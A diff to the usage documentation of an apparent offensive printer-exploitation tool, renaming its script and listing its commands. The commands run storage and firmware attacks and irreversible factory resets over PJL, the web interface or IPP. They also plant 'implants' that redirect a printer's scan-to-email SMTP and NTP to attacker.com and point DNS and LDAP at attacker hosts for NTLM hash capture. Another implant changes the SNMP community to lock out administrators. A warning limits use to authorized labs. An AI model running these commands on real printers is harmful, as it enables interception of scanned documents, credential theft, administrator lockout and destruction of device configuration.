@@ -5,7 +5,7 @@
 ## Storage Audit
 
 ```bash
-python printerxpl-forge.py 192.168.1.100 --storage
+python pxf.py 192.168.1.100 --storage
 ```
 
 Performs a complete audit of all storage access vectors:
@@ -67,7 +67,7 @@ Many printers expose an FTP server on port 21 for print job spooling and file tr
 ## Firmware Audit
 
 ```bash
-python printerxpl-forge.py 192.168.1.100 --firmware
+python pxf.py 192.168.1.100 --firmware
 ```
 
 Performs a firmware security assessment:
@@ -113,13 +113,13 @@ Probes all known firmware upload paths to detect unauthenticated upload vulnerab
 
 ```bash
 # Via PJL (most common — HP, Epson, Lexmark)
-python printerxpl-forge.py 192.168.1.100 --firmware-reset pjl
+python pxf.py 192.168.1.100 --firmware-reset pjl
 
 # Via web interface (EWS) — HP, Ricoh, Canon
-python printerxpl-forge.py 192.168.1.100 --firmware-reset web
+python pxf.py 192.168.1.100 --firmware-reset web
 
 # Via IPP (Brother, Kyocera)
-python printerxpl-forge.py 192.168.1.100 --firmware-reset ipp
+python pxf.py 192.168.1.100 --firmware-reset ipp
 ```
 
 **WARNING:** Factory reset is irreversible and will erase all configuration, credentials, and network settings. Only use in authorized labs.
@@ -134,19 +134,19 @@ Modify the printer's persistent configuration to maintain access or intercept tr
 
 ```bash
 # Redirect all scan-to-email through your SMTP relay
-python printerxpl-forge.py 192.168.1.100 --implant smtp_host=attacker.com
+python pxf.py 192.168.1.100 --implant smtp_host=attacker.com
 
 # Change DNS (affects all hostname lookups from the printer)
-python printerxpl-forge.py 192.168.1.100 --implant dns=192.168.1.200
+python pxf.py 192.168.1.100 --implant dns=192.168.1.200
 
 # Change SNMP write community (lock out legitimate admins)
-python printerxpl-forge.py 192.168.1.100 --implant snmp_community=s3cr3t
+python pxf.py 192.168.1.100 --implant snmp_community=s3cr3t
 
 # Change NTP server (time manipulation)
-python printerxpl-forge.py 192.168.1.100 --implant ntp=attacker.com
+python pxf.py 192.168.1.100 --implant ntp=attacker.com
 
 # Change LDAP server (NTLM hash capture - see Lateral Movement)
-python printerxpl-forge.py 192.168.1.100 --implant ldap_host=192.168.1.200
+python pxf.py 192.168.1.100 --implant ldap_host=192.168.1.200
 ```
 
 Implants are written via:
